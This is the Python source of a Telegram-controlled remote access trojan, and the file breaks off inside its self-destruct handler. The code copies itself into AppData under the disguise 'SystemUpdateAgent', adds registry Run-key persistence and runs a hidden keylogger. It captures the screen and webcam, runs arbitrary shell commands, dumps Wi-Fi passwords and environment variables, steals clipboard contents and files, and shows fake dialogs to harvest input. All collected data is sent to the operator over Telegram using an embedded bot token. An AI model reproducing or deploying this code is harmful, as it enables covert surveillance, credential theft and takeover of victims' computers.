import base64
import os
import platform
import re
import shutil
import socket
import subprocess
import sys
import threading
import time
from PIL import Image, ImageGrab
import requests
import telebot
from telebot import types

# Optional Dependencies with Graceful Fallbacks
try:
  from pynput import keyboard

  PYNPUT_AVAILABLE = True
except ImportError:
  PYNPUT_AVAILABLE = False

try:
  import cv2
  import numpy as np

  CV2_AVAILABLE = True
except ImportError:
  CV2_AVAILABLE = False

# --- CONFIGURATION ---
TOKEN = '9203656096:AAG08jx0GBDyu5yJRlLAMdCJkD5a7S9LjoY'
AUTHORIZED_CHAT_ID = 7620704718

# Initialize TeleBot instance
bot = telebot.TeleBot(TOKEN)

# Global references for locking and keylogger buffer
_lock_file_handle = None
_keystroke_buffer = ''

def self_relocate():
  """Automatically copies the compiled executable to a permanent system path

  (AppData\\Roaming) on first run, launches it from there, and exits the
  temporary instance.
  """
  if getattr(sys, 'frozen', False):
    current_path = sys.executable
    appdata_dir = os.path.expanduser('~\\AppData\\Roaming')
    target_dir = os.path.join(appdata_dir, 'SystemUpdateAgent')
    target_path = os.path.join(target_dir, 'update_service.exe')

    if os.path.abspath(current_path).lower() != os.path.abspath(
        target_path
    ).lower():
      try:
        os.makedirs(target_dir, exist_ok=True)
        shutil.copy2(current_path, target_path)

        if platform.system() == 'Windows':
          subprocess.Popen(
              [target_path] + sys.argv[1:], creationflags=0x08000000
          )
        else:
          subprocess.Popen([target_path] + sys.argv[1:])

        sys.exit(0)
      except Exception as e:
        print(f'[-] Relocation error: {e}')

def enforce_single_instance():
  """Enforces a strict Single-Instance Lock (Mutex style)."""
  global _lock_file_handle
  try:
    lock_path = os.path.join(
        os.environ.get('TEMP', os.path.expanduser('~')),
        'system_update_agent.lock',
    )
    _lock_file_handle = open(lock_path, 'w')

    if platform.system() == 'Windows':
      import msvcrt

      msvcrt.locking(_lock_file_handle.fileno(), msvcrt.LK_NBLCK, 1)
  except (IOError, OSError):
    sys.exit(0)

def get_system_info():
  """Collects basic system telemetry."""
  try:
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    os_name = f'{platform.system()} {platform.release()}'
  except Exception:
    hostname = 'Unknown'
    local_ip = '127.0.0.1'
    os_name = platform.system()
  return hostname, local_ip, os_name

def setup_persistence():
  """Establishes stealthy registry persistence."""
  try:
    if platform.system() == 'Windows':
      import winreg

      if getattr(sys, 'frozen', False):
        target_path = os.path.join(
            os.path.expanduser('~\\AppData\\Roaming'),
            'SystemUpdateAgent',
            'update_service.exe',
        )
      else:
        target_path = os.path.abspath(__file__)

      key = winreg.HKEY_CURRENT_USER
      sub_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
      with winreg.OpenKey(
          key, sub_key, 0, winreg.KEY_SET_VALUE
      ) as reg_key:
        winreg.SetValueEx(
            reg_key,
            'SystemUpdateAgent',
            0,
            winreg.REG_SZ,
            f'"{target_path}"',
        )
  except Exception as e:
    print(f'[-] Persistence error: {e}')

def capture_windows_screenshot(output_path='screenshot.png'):
  """Captures screen cleanly using Pillow ImageGrab."""
  try:
    img = ImageGrab.grab(all_screens=True)
    img.save(output_path, 'PNG')
    return True
  except Exception as e:
    print(f'[-] Native screenshot error: {e}')
    return False

def capture_webcam_snapshot(output_path='webcam_snap.jpg'):
  """Captures a snapshot from the target's primary webcam device."""
  if not CV2_AVAILABLE:
    return False
  try:
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
      return False
    ret, frame = cap.read()
    cap.release()
    if ret:
      cv2.imwrite(output_path, frame)
      return True
    return False
  except Exception as e:
    print(f'[-] Webcam capture error: {e}')
    return False

def search_files_by_extension(ext):
  """Scans common user directories for specific file extensions."""
  results = []
  target_dirs = [
      os.path.expanduser('~\\Desktop'),
      os.path.expanduser('~\\Documents'),
  ]
  if not ext.startswith('.'):
    ext = '.' + ext

  for d in target_dirs:
    if os.path.exists(d):
      for root, dirs, files in os.walk(d):
        for file in files:
          if file.lower().endswith(ext.lower()):
            results.append(os.path.join(root, file))
            if len(results) >= 25:
              break
  return results

def background_record_and_send(chat_id):
  """Captures high-resolution frames in a background thread and compiles

  them into a crisp animated GIF activity clip.
  """
  gif_path = 'screen_recording.gif'
  duration = 8
  interval = 1.0
  num_frames = int(duration / interval)
  frames = []
  temp_files = []

  try:
    for i in range(num_frames):
      frame_name = f'frame_{i}.png'
      if capture_windows_screenshot(frame_name):
        img = Image.open(frame_name)
        frames.append(img.copy())
        img.close()
        temp_files.append(frame_name)
      time.sleep(interval)

    if frames:
      frames[0].save(
          gif_path,
          format='GIF',
          append_images=frames[1:],
          save_all=True,
          duration=int(interval * 1000),
          loop=0,
      )

      for img in frames:
        img.close()

      with open(gif_path, 'rb') as f:
        bot.send_animation(
            chat_id,
            f,
            caption='🎥 **High-Resolution Target Activity Clip**',
            parse_mode='Markdown',
        )

      if os.path.exists(gif_path):
        os.remove(gif_path)
    else:
      bot.send_message(
          chat_id,
          '[-] Screen recording failed (Check if target user is logged in).',
      )

  except Exception as e:
    bot.send_message(chat_id, f'[-] Screen recording error: {str(e)}')

  for f in temp_files:
    if os.path.exists(f):
      os.remove(f)

def simulate_mouse_click(x, y):
  """Moves mouse to coordinates and simulates a left click using native ctypes."""
  try:
    import ctypes

    ctypes.windll.user32.SetCursorPos(int(x), int(y))
    ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
    ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
    return True
  except Exception as e:
    print(f'[-] Mouse click error: {e}')
    return False

def simulate_keyboard_typing(text):
  """Simulates typing text safely using Base64-encoded PowerShell SendKeys."""
  try:
    safe_text = text.replace("'", "''")
    ps_script = (
        'Add-Type -AssemblyName System.Windows.Forms; '
        f"[System.Windows.Forms.SendKeys]::SendWait('{safe_text}')"
    )
    encoded_cmd = base64.b64encode(ps_script.encode('utf-16-le')).decode('utf-8')

    subprocess.run(['powershell', '-EncodedCommand', encoded_cmd], check=True)
    return True
  except Exception as e:
    print(f'[-] Typing simulation error: {e}')
    return False

def show_target_message_box(prompt_text):
  """Pops up a prompt dialog on the target machine safely using Base64 encoding."""
  try:
    safe_text = prompt_text.replace("'", "''")
    ps_script = (
        'Add-Type -AssemblyName Microsoft.VisualBasic; '
        f"$res = [Microsoft.VisualBasic.Interaction]::InputBox('{safe_text}',"
        " 'System Notification', ''); [Console]::OutputEncoding ="
        ' [System.Text.Encoding]::UTF8; Write-Output $res'
    )
    encoded_cmd = base64.b64encode(ps_script.encode('utf-16-le')).decode('utf-8')

    result = subprocess.check_output(
        ['powershell', '-EncodedCommand', encoded_cmd], text=True, errors='ignore'
    ).strip()
    return result
  except Exception as e:
    print(f'[-] Message box error: {e}')
    return None

# --- KEYLOGGER BACKGROUND LISTENER ---
def on_press(key):
  global _keystroke_buffer
  try:
    if hasattr(key, 'char') and key.char is not None:
      _keystroke_buffer += key.char
    else:
      if key == keyboard.Key.space:  # type: ignore
        _keystroke_buffer += ' '
      elif key == keyboard.Key.enter:  # type: ignore
        _keystroke_buffer += '\n[ENTER]\n'
      elif key == keyboard.Key.backspace:  # type: ignore
        if len(_keystroke_buffer) > 0:
          _keystroke_buffer = _keystroke_buffer[:-1]
      elif key == keyboard.Key.tab:  # type: ignore
        _keystroke_buffer += '\t'
      else:
        key_name = str(key).replace('Key.', '')
        _keystroke_buffer += f' [{key_name.upper()}] '
  except Exception:
    pass

def start_keylogger_background():
  """Starts the pynput keyboard listener in a daemon thread."""
  if not PYNPUT_AVAILABLE:
    print('[-] pynput module not found. Keylogger background listener disabled.')
    return
  try:
    listener = keyboard.Listener(on_press=on_press)  # type: ignore
    listener.daemon = True
    listener.start()
    print('[+] Background keylogger started successfully.')
  except Exception as e:
    print(f'[-] Keylogger startup error: {e}')

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def cmd_help(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    help_text = (
        '🛠 **Cross-Platform Remote Agent Command Set:**\n\n'
        '🔹 **Core & Telemetry:**\n'
        '/status - Check agent connection status\n'
        '/whoami - Show current user and privileges\n'
        '/sysinfo - Display hardware and network telemetry\n'
        '/report - Generate & download full system activity & keylog report\n'
        '/instruction - Display complete operator guide & instructions\n\n'
        '🔹 **Red Team Reconnaissance & Post-Exploitation:**\n'
        '/netstat - List active network connections and listening ports\n'
        '/services - Enumerate Windows services (privesc / path checks)\n'
        '/tasks - List scheduled tasks (persistence & execution vectors)\n'
        '/privs - Display user token privileges and groups\n'
        '/env - Extract environment variables and credentials\n\n'
        '🔹 **Monitoring & Surveillance:**\n'
        '/desktop - Launch interactive remote desktop view\n'
        '/screenshot - Capture single target screen snapshot\n'
        '/video - Record & send high-resolution 8s screen clip\n'
        '/webcam - Capture live snapshot from target webcam\n'
        '/searchfiles <ext> - Scan Desktop/Documents for file type (e.g. .pdf)\n\n'
        '🔹 **Active Control:**\n'
        '/click <x> <y> - Simulate left click at X, Y coordinates\n'
        '/type <text> - Simulate typing text on target keyboard\n'
        '/msg <text> - Send message popup to target & capture response\n'
        '/lock - Lock the target screen (Windows)\n\n'
        '🔹 **System & Process Control:**\n'
        '/shell <cmd> - Execute arbitrary shell command\n'
        '/processes - List running processes\n'
        '/kill <pid> - Terminate a process by PID\n'
        '/shutdown - Shutdown target system\n'
        '/restart - Reboot target system\n\n'
        '🔹 **File & Data Operations:**\n'
        '/download <path> - Download file from target\n'
        '/upload - Upload file to target (send as document)\n'
        '/clipboard - Extract current clipboard text\n'
        '/wifi - Retrieve saved Wi-Fi profiles & passwords\n\n'
        '🔹 **Advanced / Maintenance:**\n'
        '/persist - Re-enforce persistence mechanism\n'
        '/location - Get approximate location (IP-based)\n'
        '/clean - Clear local execution logs/history\n'
        '/selfdestruct - Wipe agent and terminate process'
    )
    bot.reply_to(message, help_text, parse_mode='Markdown')
  else:
    bot.reply_to(message, '⚠️ Unauthorized access attempt.')

@bot.message_handler(commands=['instruction', 'guide'])
def cmd_instruction(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    guide_text = (
        '📖 **Operator Guide & Instructions:**\n\n'
        '1. **Deployment & Stealth:** Upon execution, the compiled agent'
        ' automatically copies itself to'
        ' `AppData\\Roaming\\SystemUpdateAgent\\update_service.exe` and'
        ' registers a Windows Registry startup key for persistence.\n'
        '2. **Session 0 Limitation:** Desktop interaction commands'
        ' (`/desktop`, `/screenshot`, `/video`, `/webcam`) require the target'
        ' user to be **actively logged into their Windows desktop session**.\n'
        '3. **Keylogging:** Keystrokes are monitored and buffered silently in'
        ' the background. Use `/report` to compile telemetry and retrieve the'
        ' keystroke log file.\n'
        '4. **Reconnaissance:** Use the newly added red team commands'
        ' (`/netstat`, `/services`, `/tasks`, `/privs`, `/env`) to quickly map'
        ' internal states and privilege escalation vectors.'
    )
    bot.reply_to(message, guide_text, parse_mode='Markdown')

# --- NEW RED TEAM RECON COMMAND HANDLERS ---

@bot.message_handler(commands=['netstat'])
def cmd_netstat(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      res = subprocess.check_output(
          'netstat -ano', shell=True, text=True, errors='ignore'
      )
      lines = '\n'.join(res.splitlines()[:35])  # Limit lines for Telegram
      if len(lines) > 4000:
        lines = lines[:3996] + '\n[Truncated...]'
      bot.reply_to(
          message,
          f'🌐 **Active Network Connections (`netstat -ano`):**\n```{lines}```',
          parse_mode='Markdown',
      )
    except Exception as e:
      bot.reply_to(message, f'[-] Netstat execution error: {str(e)}')

@bot.message_handler(commands=['services'])
def cmd_services(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        res = subprocess.check_output(
            'powershell -command "Get-Service | Select-Object Status, Name,'
            ' DisplayName | Select-Object -First 30"',
            shell=True,
            text=True,
            errors='ignore',
        )
      else:
        res = subprocess.check_output(
            'service --status-all', shell=True, text=True, errors='ignore'
        )

      if len(res) > 4000:
        res = res[:3996] + '\n[Truncated...]'
      bot.reply_to(
          message,
          f'⚙️ **Windows Services Enumeration:**\n```{res}```',
          parse_mode='Markdown',
      )
    except Exception as e:
      bot.reply_to(message, f'[-] Services enumeration error: {str(e)}')

@bot.message_handler(commands=['tasks'])
def cmd_tasks(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        res = subprocess.check_output(
            'schtasks /query /fo TABLE /nh',
            shell=True,
            text=True,
            errors='ignore',
        )
        lines = '\n'.join(res.splitlines()[:30])
      else:
        res = subprocess.check_output(
            'crontab -l', shell=True, text=True, errors='ignore'
        )
        lines = res

      if len(lines) > 4000:
        lines = lines[:3996] + '\n[Truncated...]'
      bot.reply_to(
          message,
          f'📅 **Scheduled Tasks Enumeration:**\n```{lines}```',
          parse_mode='Markdown',
      )
    except Exception as e:
      bot.reply_to(message, f'[-] Scheduled tasks error: {str(e)}')

@bot.message_handler(commands=['privs'])
def cmd_privs(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        res = subprocess.check_output(
            'whoami /all', shell=True, text=True, errors='ignore'
        )
      else:
        res = subprocess.check_output(
            'id && groups', shell=True, text=True, errors='ignore'
        )

      if len(res) > 4000:
        res = res[:3996] + '\n[Truncated...]'
      bot.reply_to(
          message,
          f'🛡️ **User Token Privileges & Groups (`whoami /all`):**\n```{res}```',
          parse_mode='Markdown',
      )
    except Exception as e:
      bot.reply_to(message, f'[-] Privileges enumeration error: {str(e)}')

@bot.message_handler(commands=['env'])
def cmd_env(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        res = subprocess.check_output(
            'set', shell=True, text=True, errors='ignore'
        )
      else:
        res = subprocess.check_output(
            'env', shell=True, text=True, errors='ignore'
        )

      lines = '\n'.join(res.splitlines()[:35])
      if len(lines) > 4000:
        lines = lines[:3996] + '\n[Truncated...]'
      bot.reply_to(
          message,
          f'🔐 **Environment Variables Dump:**\n```{lines}```',
          parse_mode='Markdown',
      )
    except Exception as e:
      bot.reply_to(message, f'[-] Environment dump error: {str(e)}')

# --- STANDARD & SURVEILLANCE COMMAND HANDLERS ---

@bot.message_handler(commands=['status'])
def cmd_status(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    hostname, local_ip, os_name = get_system_info()
    status_msg = (
        '🟢 **Agent Status: Online**\n'
        f'💻 Hostname: `{hostname}`\n'
        f'🌐 Local IP: `{local_ip}`\n'
        f'⚙️ OS: `{os_name}`'
    )
    bot.reply_to(message, status_msg, parse_mode='Markdown')

@bot.message_handler(commands=['whoami'])
def cmd_whoami(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      res = subprocess.check_output(
          'whoami', shell=True, text=True, errors='ignore'
      )
      bot.reply_to(message, f'👤 **User:** `{res.strip()}`', parse_mode='Markdown')
    except Exception as e:
      bot.reply_to(message, f'[-] Error: {str(e)}')

@bot.message_handler(commands=['sysinfo'])
def cmd_sysinfo(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    hostname, local_ip, os_name = get_system_info()
    info_msg = (
        '📊 **System Telemetry:**\n'
        f'• Hostname: `{hostname}`\n'
        f'• Local IP: `{local_ip}`\n'
        f'• OS Platform: `{os_name}`\n'
        f'• Python Version: `{platform.python_version()}`'
    )
    bot.reply_to(message, info_msg, parse_mode='Markdown')

@bot.message_handler(commands=['report'])
def cmd_report(message):
  global _keystroke_buffer
  if message.chat.id == AUTHORIZED_CHAT_ID:
    bot.reply_to(message, '📊 Compiling system telemetry and keylog report...')
    hostname, local_ip, os_name = get_system_info()
    report_filename = 'activity_report.txt'

    report_content = (
        '========================================\n'
        '       TARGET SYSTEM & ACTIVITY REPORT  \n'
        '========================================\n'
        f'Hostname: {hostname}\n'
        f'Local IP: {local_ip}\n'
        f'OS Platform: {os_name}\n'
        f"Report Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        '----------------------------------------\n\n'
        '--- CAPTURED KEYSTROKES BUFFER ---\n'
        f"{_keystroke_buffer if _keystroke_buffer.strip() else '[No keystrokes recorded in current buffer]'}\n"
    )

    try:
      with open(report_filename, 'w', encoding='utf-8') as f:
        f.write(report_content)

      with open(report_filename, 'rb') as f:
        bot.send_document(
            AUTHORIZED_CHAT_ID,
            f,
            caption='📊 **Target Activity & Keylog Report Document**',
            parse_mode='Markdown',
        )
      os.remove(report_filename)
      _keystroke_buffer = ''
    except Exception as e:
      bot.reply_to(message, f'[-] Failed to generate or send report: {str(e)}')

@bot.message_handler(commands=['desktop'])
def cmd_desktop(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      screenshot_path = 'desktop_view.png'
      if capture_windows_screenshot(screenshot_path):
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton(
                '🔄 Refresh', callback_data='desktop_refresh'
            ),
            types.InlineKeyboardButton('❌ Close', callback_data='desktop_close'),
        )

        with open(screenshot_path, 'rb') as f:
          bot.send_photo(
              AUTHORIZED_CHAT_ID,
              f,
              caption=(
                  '🖥 **Interactive Remote Desktop Monitor**\nUse `/click <x>'
                  ' <y>` or `/type <text>` to control.'
              ),
              reply_markup=markup,
              parse_mode='Markdown',
          )
        os.remove(screenshot_path)
      else:
        bot.reply_to(message, '[-] Failed to capture native remote desktop.')
    except Exception as e:
      bot.reply_to(message, f'[-] Remote desktop error: {str(e)}')

@bot.message_handler(commands=['video', 'record'])
def cmd_video(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    bot.reply_to(
        message,
        '🎬 Recording high-resolution screen clip in background... Please'
        ' wait.',
    )
    threading.Thread(
        target=background_record_and_send, args=(message.chat.id,)
    ).start()

@bot.message_handler(commands=['webcam'])
def cmd_webcam(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    bot.reply_to(message, '📷 Capturing live webcam snapshot...')
    snap_path = 'webcam_snap.jpg'
    if capture_webcam_snapshot(snap_path):
      try:
        with open(snap_path, 'rb') as f:
          bot.send_photo(
              AUTHORIZED_CHAT_ID,
              f,
              caption='📸 **Target Webcam Surveillance Snapshot**',
              parse_mode='Markdown',
          )
        os.remove(snap_path)
      except Exception as e:
        bot.reply_to(message, f'[-] Failed to send webcam snapshot: {str(e)}')
    else:
      bot.reply_to(
          message,
          '[-] Webcam capture failed (No camera found or hardware in use).',
      )

@bot.message_handler(commands=['searchfiles'])
def cmd_searchfiles(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    parts = message.text.replace('/searchfiles', '').strip()
    if not parts:
      bot.reply_to(
          message,
          '⚠️ Usage: `/searchfiles <extension>` (e.g., `/searchfiles pdf`)',
          parse_mode='Markdown',
      )
      return

    bot.reply_to(message, f'🔍 Scanning target directories for `*.{parts}` files...')
    found_files = search_files_by_extension(parts)

    if found_files:
      file_list_str = '\n'.join([f'• `{f}`' for f in found_files])
      if len(file_list_str) > 4000:
        file_list_str = file_list_str[:3996] + '\n[Truncated...]'
      bot.reply_to(
          message,
          f'📂 **Discovered Files (`*.{parts}`):**\n{file_list_str}',
          parse_mode='Markdown',
      )
    else:
      bot.reply_to(message, f'📭 No matching `*.{parts}` files found on target.')

@bot.callback_query_handler(func=lambda call: call.data.startswith('desktop_'))
def callback_desktop(call):
  if call.message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if call.data == 'desktop_refresh':
        screenshot_path = 'desktop_view.png'
        if capture_windows_screenshot(screenshot_path):
          markup = types.InlineKeyboardMarkup()
          markup.row(
              types.InlineKeyboardButton(
                  '🔄 Refresh', callback_data='desktop_refresh'
              ),
              types.InlineKeyboardButton('❌ Close', callback_data='desktop_close'),
          )

          with open(screenshot_path, 'rb') as f:
            media = types.InputMediaPhoto(
                f,
                caption=(
                    '🖥 **Interactive Remote Desktop Monitor (Refreshed)**'
                ),
            )
            bot.edit_message_media(
                media=media,
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=markup,
            )
          os.remove(screenshot_path)
          bot.answer_callback_query(call.id, 'Screen updated successfully!')
        else:
          bot.answer_callback_query(call.id, 'Failed to capture screen.')

      elif call.data == 'desktop_close':
        bot.delete_message(
            chat_id=call.message.chat.id, message_id=call.message.message_id
        )
        bot.answer_callback_query(call.id, 'Remote desktop session closed.')
    except Exception as e:
      bot.answer_callback_query(call.id, f'Error: {str(e)}')

@bot.message_handler(commands=['click'])
def cmd_click(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    parts = message.text.replace('/click', '').strip().split()
    if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
      bot.reply_to(
          message,
          '⚠️ Usage: `/click <x> <y>` (e.g., `/click 500 300`)',
          parse_mode='Markdown',
      )
      return
    x, y = parts[0], parts[1]
    if simulate_mouse_click(x, y):
      bot.reply_to(
          message,
          f'[+] Click simulated at coordinates: `({x}, {y})`',
          parse_mode='Markdown',
      )
    else:
      bot.reply_to(message, '[-] Failed to simulate mouse click.')

@bot.message_handler(commands=['type'])
def cmd_type(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    text_to_type = message.text.replace('/type', '').strip()
    if not text_to_type:
      bot.reply_to(
          message, '⚠️ Usage: `/type <text to send>`', parse_mode='Markdown'
      )
      return
    if simulate_keyboard_typing(text_to_type):
      bot.reply_to(
          message,
          f'[+] Sent keystrokes: `{text_to_type}`',
          parse_mode='Markdown',
      )
    else:
      bot.reply_to(message, '[-] Failed to simulate keyboard typing.')

@bot.message_handler(commands=['msg', 'message'])
def cmd_msg(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    text_to_send = (
        message.text.replace('/msg', '').replace('/message', '').strip()
    )
    if not text_to_send:
      bot.reply_to(
          message,
          '⚠️ Usage: `/msg <message to send to target>`',
          parse_mode='Markdown',
      )
      return

    bot.reply_to(
        message,
        f'[+] Prompting target with message: `{text_to_send}`\nWaiting for'
        ' response...',
        parse_mode='Markdown',
    )

    target_response = show_target_message_box(text_to_send)

    if target_response:
      bot.send_message(
          AUTHORIZED_CHAT_ID,
          f'💬 **Target Response Received:**\n```{target_response}```',
          parse_mode='Markdown',
      )
    else:
      bot.send_message(
          AUTHORIZED_CHAT_ID,
          '⚠️ Target closed the message box or did not type a response.',
          parse_mode='Markdown',
      )

@bot.message_handler(commands=['screenshot'])
def cmd_screenshot(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      screenshot_path = 'screenshot.png'
      if capture_windows_screenshot(screenshot_path):
        with open(screenshot_path, 'rb') as f:
          bot.send_photo(AUTHORIZED_CHAT_ID, f)
        os.remove(screenshot_path)
      else:
        bot.reply_to(message, '[-] Screenshot capture failed.')
    except Exception as e:
      bot.reply_to(message, f'[-] Error: {str(e)}')

@bot.message_handler(commands=['shell'])
def cmd_shell(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    cmd_text = message.text.replace('/shell', '').strip()
    if not cmd_text:
      bot.reply_to(message, '⚠️ Usage: `/shell <command>`', parse_mode='Markdown')
      return
    try:
      res = subprocess.check_output(
          cmd_text,
          shell=True,
          text=True,
          stderr=subprocess.STDOUT,
          errors='ignore',
          timeout=15,
      )
      if len(res) > 4000:
        res = res[:3996] + '\n[Truncated...]'
      bot.reply_to(message, f'💻 **Output:**\n```{res}```', parse_mode='Markdown')
    except Exception as e:
      bot.reply_to(message, f'[-] Execution Error: {str(e)}')

@bot.message_handler(commands=['processes'])
def cmd_processes(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        res = subprocess.check_output(
            'tasklist', shell=True, text=True, errors='ignore'
        )
      else:
        res = subprocess.check_output(
            'ps aux', shell=True, text=True, errors='ignore'
        )

      lines = '\n'.join(res.splitlines()[:25])
      bot.reply_to(
          message,
          f'⚙️ **Running Processes (Top 25):**\n```{lines}```',
          parse_mode='Markdown',
      )
    except Exception as e:
      bot.reply_to(message, f'[-] Error fetching processes: {str(e)}')

@bot.message_handler(commands=['kill'])
def cmd_kill(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    target = message.text.replace('/kill', '').strip()
    if not target:
      bot.reply_to(
          message, '⚠️ Usage: `/kill <PID or Name>`', parse_mode='Markdown'
      )
      return
    try:
      if platform.system() == 'Windows':
        cmd = (
            f'taskkill /f /im {target}'
            if not target.isdigit()
            else f'taskkill /f /pid {target}'
        )
      else:
        cmd = f'pkill -f {target}'
      subprocess.run(cmd, shell=True, check=True)
      bot.reply_to(
          message, f'[+] Successfully terminated: `{target}`', parse_mode='Markdown'
      )
    except Exception as e:
      bot.reply_to(message, f'[-] Failed to kill process: {str(e)}')

@bot.message_handler(commands=['lock'])
def cmd_lock(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        subprocess.run('rundll32.exe user32.dll,LockWorkStation', shell=True)
        bot.reply_to(message, '[+] Workstation locked successfully.')
      else:
        bot.reply_to(message, '[-] Lock not supported on this OS.')
    except Exception as e:
      bot.reply_to(message, f'[-] Error: {str(e)}')

@bot.message_handler(commands=['shutdown'])
def cmd_shutdown(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      cmd = 'shutdown /s /t 5' if platform.system() == 'Windows' else 'reboot -p'
      subprocess.run(cmd, shell=True)
      bot.reply_to(message, '[!] System shutting down...')
    except Exception as e:
      bot.reply_to(message, f'[-] Error: {str(e)}')

@bot.message_handler(commands=['restart'])
def cmd_restart(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      cmd = 'shutdown /r /t 5' if platform.system() == 'Windows' else 'reboot'
      subprocess.run(cmd, shell=True)
      bot.reply_to(message, '[!] System restarting...')
    except Exception as e:
      bot.reply_to(message, f'[-] Error: {str(e)}')

@bot.message_handler(commands=['download'])
def cmd_download(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    filepath = message.text.replace('/download', '').strip()
    if not filepath or not os.path.exists(filepath):
      bot.reply_to(message, '⚠️ File not found or invalid path specified.')
      return
    try:
      with open(filepath, 'rb') as f:
        bot.send_document(AUTHORIZED_CHAT_ID, f)
    except Exception as e:
      bot.reply_to(message, f'[-] File transfer failed: {str(e)}')

@bot.message_handler(content_types=['document'])
def handle_file_upload(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      file_info = bot.get_file(message.document.file_id)
      downloaded_file = bot.download_file(file_info.file_path)
      save_path = os.path.join(
          os.path.expanduser('~\\Downloads'), message.document.file_name
      )
      with open(save_path, 'wb') as f:
        f.write(downloaded_file)
      bot.reply_to(
          message,
          f'[+] File uploaded and saved successfully to: `{save_path}`',
          parse_mode='Markdown',
      )
    except Exception as e:
      bot.reply_to(message, f'[-] File upload failed: {str(e)}')

@bot.message_handler(commands=['clipboard'])
def cmd_clipboard(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        res = subprocess.check_output(
            'powershell -command "Get-Clipboard"',
            shell=True,
            text=True,
            errors='ignore',
        )
        if not res.strip():
          res = '[Clipboard is currently empty]'
        bot.reply_to(
            message,
            f'📋 **Clipboard Content:**\n```{res.strip()}```',
            parse_mode='Markdown',
        )
      else:
        bot.reply_to(
            message, '[-] Clipboard command is only supported on Windows.'
        )
    except Exception as e:
      bot.reply_to(message, f'[-] Clipboard error: {str(e)}')

@bot.message_handler(commands=['wifi'])
def cmd_wifi(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        # Step 1: Get all saved profile names
        profiles_data = subprocess.check_output(
            'netsh wlan show profiles', shell=True, text=True, errors='ignore'
        )
        profile_names = re.findall(r'All User Profile\s*:\s*(.*)', profiles_data)

        wifi_credentials = []
        for name in profile_names:
          name = name.strip()
          try:
            # Step 2: Query each profile for clear-text keys
            profile_info = subprocess.check_output(
                f'netsh wlan show profile name="{name}" key=clear',
                shell=True,
                text=True,
                errors='ignore',
            )
            # Step 3: Extract the password (Key Content) field
            match = re.search(r'Key Content\s*:\s*(.*)', profile_info)
            password = (
                match.group(1).strip()
                if match
                else '[No Password / Open Network]'
            )
            wifi_credentials.append(f'SSID: {name}\nPassword: {password}\n---')
          except Exception:
            wifi_credentials.append(
                f'SSID: {name}\nPassword: [Retrieval Failed]\n---'
            )

        res = (
            '\n'.join(wifi_credentials)
            if wifi_credentials
            else 'No Wi-Fi profiles found.'
        )
        if len(res) > 4000:
          res = res[:3996] + '\n[Truncated...]'

        bot.reply_to(
            message,
            f'📶 **Saved Wi-Fi Profiles & Passwords:**\n```{res}```',
            parse_mode='Markdown',
        )
      else:
        bot.reply_to(
            message, '[-] Wi-Fi password extraction is only supported on Windows.'
        )
    except Exception as e:
      bot.reply_to(message, f'[-] Wi-Fi extraction error: {str(e)}')

@bot.message_handler(commands=['persist'])
def cmd_persist(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    setup_persistence()
    bot.reply_to(message, '[+] Persistence re-applied successfully.')

@bot.message_handler(commands=['location'])
def cmd_location(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      res = requests.get('https://ipinfo.io/json', timeout=10).json()
      loc = res.get('loc', '0,0').split(',')
      bot.send_location(
          AUTHORIZED_CHAT_ID, latitude=float(loc[0]), longitude=float(loc[1])
      )
    except Exception as e:
      bot.reply_to(message, f'[-] Location fetch failed: {str(e)}')

@bot.message_handler(commands=['clean'])
def cmd_clean(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    try:
      if platform.system() == 'Windows':
        subprocess.run('doskey /history >nul', shell=True)
      bot.reply_to(message, '[+] Local traces cleared.')
    except Exception as e:
      bot.reply_to(message, f'[-] Error: {str(e)}')

@bot.message_handler(commands=['selfdestruct'])
def cmd_destruct(message):
  if message.chat.id == AUTHORIZED_CHAT_ID:
    bot.reply_to(message, '[!] Self-destruct initiated. Terminating agent...')
    try:
      if platform.system() == 'Windows':
